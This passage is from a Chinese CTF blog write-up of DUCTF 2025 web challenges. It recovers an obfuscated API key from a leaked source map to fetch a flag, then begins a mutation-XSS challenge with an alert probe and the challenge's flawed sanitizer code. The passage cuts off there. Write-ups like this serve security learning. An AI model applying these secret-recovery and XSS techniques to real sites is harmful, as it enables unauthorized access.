@@ -1,0 +1,866 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    DUCTF2025比赛复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="WEB  mini-me（文件泄露） 这题说实话-我是sb（看了好久楞是没看到有个提示） 但这也是我唯一一次在国外比赛中做出来的题，可喜可贺 该题题目给了附件 1234567891011121314151617181920212223242526272829303132333435from flask import Flask, render_template, send_from_direct">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DUCTF2025比赛复现">
+<meta property="og:url" content="http://example.com/2025/07/20/DUCTF2025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="WEB  mini-me（文件泄露） 这题说实话-我是sb（看了好久楞是没看到有个提示） 但这也是我唯一一次在国外比赛中做出来的题，可喜可贺 该题题目给了附件 1234567891011121314151617181920212223242526272829303132333435from flask import Flask, render_template, send_from_direct">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250720113627274.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250720113847606.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250720115616939.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722001914830.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/0250722005059109.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722005307418.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722011613806.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722122927969.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722123011003.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722123108826.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722131152162.png">
+<meta property="og:image" content="http://example.com/2025/07/20/images/20250722133946109.png">
+<meta property="article:published_time" content="2025-07-20T03:32:59.000Z">
+<meta property="article:modified_time" content="2025-10-22T02:55:31.470Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="XSS进阶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/07/20/images/20250720113627274.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="DUCTF2025比赛复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">DUCTF2025比赛复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mini-me%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text"> mini-me（文件泄露）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mutant%E7%AA%81%E5%8F%98xss%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text"> Mutant（突变XSS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sweet_treatcookie-sandwiching%E6%94%BB%E5%87%BB%E7%AA%83%E5%8F%96httponly-cookie"><span class="toc-number">1.3.</span> <span class="toc-text"> Sweet_Treat（Cookie Sandwiching攻击窃取HTTPOnly Cookie）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%9D%A2%E6%88%91%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 后面我自己的理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 官方解题脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%84%9F%E6%83%B3"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 做题感想</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-DUCTF2025比赛复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/07/20/DUCTF2025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-07-20T03:32:59.000Z" itemprop="datePublished">2025-07-20</time>
+    <time style="display: none;" id="post-update-time">2025-10-22</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> WEB</h2>
+<h3 id="mini-me文件泄露"><a class="markdownIt-Anchor" href="#mini-me文件泄露"></a> mini-me（文件泄露）</h3>
+<p>这题说实话-我是sb（看了好久楞是没看到有个提示）</p>
+<p>但这也是我唯一一次在国外比赛中做出来的题，可喜可贺</p>
+<p>该题题目给了附件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, send_from_directory, request, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> dotenv <span class="keyword">import</span> load_dotenv</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">load_dotenv()</span><br><span class="line">API_SECRET_KEY = os.getenv(<span class="string">&quot;API_SECRET_KEY&quot;</span>)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, static_folder=<span class="string">&quot;static&quot;</span>, template_folder=<span class="string">&quot;templates&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_header</span>(<span class="params">response</span>):</span><br><span class="line">    response.cache_control.no_store = <span class="literal">True</span></span><br><span class="line">    response.cache_control.must_revalidate = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/confidential.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/confidential.html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">confidential</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;confidential.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/flag&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    key = request.headers.get(<span class="string">&quot;X-API-Key&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key == API_SECRET_KEY:</span><br><span class="line">        <span class="keyword">return</span> FLAG</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br></pre></td></tr></table></figure>
+<p>根路由：</p>
+<p><img src="../images/20250720113627274.png" alt="image-20213627274" /></p>
+<p>随便登录进去就直达一个鬼畜视频，没用</p>
+<p>我们看/admin/flag路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/flag&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    key = request.headers.get(<span class="string">&quot;X-API-Key&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> key == API_SECRET_KEY:</span><br><span class="line">        <span class="keyword">return</span> FLAG</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br></pre></td></tr></table></figure>
+<p>提示得很明显，找密钥，所以我之前一直在爆破密钥，愣是没看到在根路由里的js文件下有个提示：</p>
+<p><img src="../images/20250720113847606.png" alt="image-20250720113847606" /></p>
+<p>这个意思是有一个</p>
+<p>在测试环境中有一个test-main.min.js.map，在实际环境中应该删去</p>
+<p>但它删没删我们一验便知</p>
+<p>访问/static/js/test-main.min.js.map</p>
+<p>成功下载下来了</p>
+<p>里面有一个混淆函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">qyrbkc</span>(<span class="params"></span>) &#123; </span><br><span class="line">  <span class="keyword">const</span> xtqzp = [<span class="string">&quot;85&quot;</span>], vmsdj = [<span class="string">&quot;87&quot;</span>], rlfka = [<span class="string">&quot;77&quot;</span>], wfthn = [<span class="string">&quot;67&quot;</span>], zdqo = [<span class="string">&quot;40&quot;</span>], yclur = [<span class="string">&quot;82&quot;</span>],</span><br><span class="line">        bpxmg = [<span class="string">&quot;82&quot;</span>], hkfav = [<span class="string">&quot;70&quot;</span>], oqzdu = [<span class="string">&quot;78&quot;</span>], nwtjb = [<span class="string">&quot;39&quot;</span>], sgfyk = [<span class="string">&quot;95&quot;</span>], utxzr = [<span class="string">&quot;89&quot;</span>],</span><br><span class="line">        jvmqa = [<span class="string">&quot;67&quot;</span>], dpwls = [<span class="string">&quot;73&quot;</span>], xaogc = [<span class="string">&quot;34&quot;</span>], eqhvt = [<span class="string">&quot;68&quot;</span>], mfzoj = [<span class="string">&quot;68&quot;</span>], lbknc = [<span class="string">&quot;92&quot;</span>],</span><br><span class="line">        zpeds = [<span class="string">&quot;84&quot;</span>], cvnuy = [<span class="string">&quot;57&quot;</span>], ktwfa = [<span class="string">&quot;70&quot;</span>], xdglo = [<span class="string">&quot;87&quot;</span>], fjyhr = [<span class="string">&quot;95&quot;</span>], vtuze = [<span class="string">&quot;77&quot;</span>], awphs = [<span class="string">&quot;75&quot;</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> dhgyvu = [xtqzp[<span class="number">0</span>], vmsdj[<span class="number">0</span>], rlfka[<span class="number">0</span>], wfthn[<span class="number">0</span>], zdqo[<span class="number">0</span>], yclur[<span class="number">0</span>], </span><br><span class="line">                  bpxmg[<span class="number">0</span>], hkfav[<span class="number">0</span>], oqzdu[<span class="number">0</span>], nwtjb[<span class="number">0</span>], sgfyk[<span class="number">0</span>], utxzr[<span class="number">0</span>], </span><br><span class="line">                  jvmqa[<span class="number">0</span>], dpwls[<span class="number">0</span>], xaogc[<span class="number">0</span>], eqhvt[<span class="number">0</span>], mfzoj[<span class="number">0</span>], lbknc[<span class="number">0</span>], </span><br><span class="line">                  zpeds[<span class="number">0</span>], cvnuy[<span class="number">0</span>], ktwfa[<span class="number">0</span>], xdglo[<span class="number">0</span>], fjyhr[<span class="number">0</span>], vtuze[<span class="number">0</span>], awphs[<span class="number">0</span>]];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> lmsvdt = dhgyvu.<span class="title function_">map</span>(<span class="function">(<span class="params">pjgrx, fkhzu</span>) =&gt;</span></span><br><span class="line">    <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(</span><br><span class="line">      <span class="title class_">Number</span>(pjgrx) ^ (fkhzu + <span class="number">1</span>) ^ <span class="number">0</span> </span><br><span class="line">    )</span><br><span class="line">  ).<span class="title function_">reduce</span>(<span class="function">(<span class="params">qdmfo, lxzhs</span>) =&gt;</span> qdmfo + lxzhs, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Note: Key is now secured with heavy obfuscation, should be safe to use in prod :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一开就知道是密钥</p>
+<p>按照它的操作还原密钥：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> codes = [<span class="string">&quot;85&quot;</span>, <span class="string">&quot;87&quot;</span>, <span class="string">&quot;77&quot;</span>, <span class="string">&quot;67&quot;</span>, <span class="string">&quot;40&quot;</span>, <span class="string">&quot;82&quot;</span>, <span class="string">&quot;82&quot;</span>, <span class="string">&quot;70&quot;</span>, <span class="string">&quot;78&quot;</span>, <span class="string">&quot;39&quot;</span>, <span class="string">&quot;95&quot;</span>, <span class="string">&quot;89&quot;</span>, <span class="string">&quot;67&quot;</span>, <span class="string">&quot;73&quot;</span>, <span class="string">&quot;34&quot;</span>, <span class="string">&quot;68&quot;</span>, <span class="string">&quot;68&quot;</span>, <span class="string">&quot;92&quot;</span>, <span class="string">&quot;84&quot;</span>, <span class="string">&quot;57&quot;</span>, <span class="string">&quot;70&quot;</span>, <span class="string">&quot;87&quot;</span>, <span class="string">&quot;95&quot;</span>, <span class="string">&quot;77&quot;</span>, <span class="string">&quot;75&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> decrypted = codes</span><br><span class="line">  .<span class="title function_">map</span>(<span class="function">(<span class="params">code, index</span>) =&gt;</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="title class_">Number</span>(code) ^ (index + <span class="number">1</span>)))</span><br><span class="line">  .<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(decrypted); <span class="comment">// 输出: TUNG-TUNG-TUNG-TUNG-SAHUR</span></span><br></pre></td></tr></table></figure>
+<p>然后在/admin/flag中添加<code>X-API-Key： TUNG-TUNG-TUNG-TUNG-SAHUR</code>即可</p>
+<p><img src="../images/20250720115616939.png" alt="image-20250720115616939" /></p>
+<h3 id="mutant突变xss绕过"><a class="markdownIt-Anchor" href="#mutant突变xss绕过"></a> Mutant（突变XSS绕过）</h3>
+<p>开题，很明确，一个xss提交框</p>
+<p><img src="../images/20250722001914830.png" alt="image-20250722001914830" /></p>
+<p>题目提示我们flag在cookie里面，直接插就行了[猖狂！但我也没办法~]</p>
+<p>我们随便输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>没反应，那包被过滤了的呀</p>
+<p>看看有没有源码泄露什么的</p>
+<p>打开f12里面就有一个js文件</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> inp = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>).<span class="title function_">get</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reporting stuff</span></span><br><span class="line">reportbtn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">fetch</span>(<span class="string">&quot;/report&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">body</span>: inp</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;Successfully reported&quot;</span>)).<span class="title function_">catch</span>(alert);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Challenge</span></span><br><span class="line">mytextarea.<span class="property">value</span> = inp;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Original&quot;</span>, inp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> t = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;template&quot;</span>);</span><br><span class="line">t.<span class="property">innerHTML</span> = inp;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After injecting into template&quot;</span>, t.<span class="property">innerHTML</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nodes = [t.<span class="property">content</span>];</span><br><span class="line"><span class="keyword">while</span> (nodes.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> n = nodes.<span class="title function_">pop</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Parsed element&quot;</span>, n.<span class="property">outerHTML</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n.<span class="property">attributes</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (n.<span class="property">attributes</span>.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      n.<span class="title function_">removeAttribute</span>(n.<span class="property">attributes</span>[<span class="number">0</span>].<span class="property">name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fix XSS reported by our bug bounty community</span></span><br><span class="line">  <span class="keyword">if</span> (n.<span class="property">nodeName</span> !== <span class="string">&quot;#document-fragment&quot;</span> &amp;&amp; (n.<span class="property">nodeName</span>.<span class="property">length</span> === <span class="number">6</span> || n.<span class="property">nodeName</span>.<span class="property">length</span> === <span class="number">8</span>)) &#123;</span><br><span class="line">    n.<span class="property">parentNode</span>.<span class="title function_">removeChild</span>(n);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = n.<span class="property">children</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    nodes.<span class="title function_">push</span>(n.<span class="property">children</span>[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After sanitization&quot;</span>, t.<span class="property">innerHTML</span>);</span><br><span class="line"></span><br><span class="line">myoutputdebug.<span class="property">innerText</span> = t.<span class="property">innerHTML</span>;</span><br><span class="line">myoutput.<span 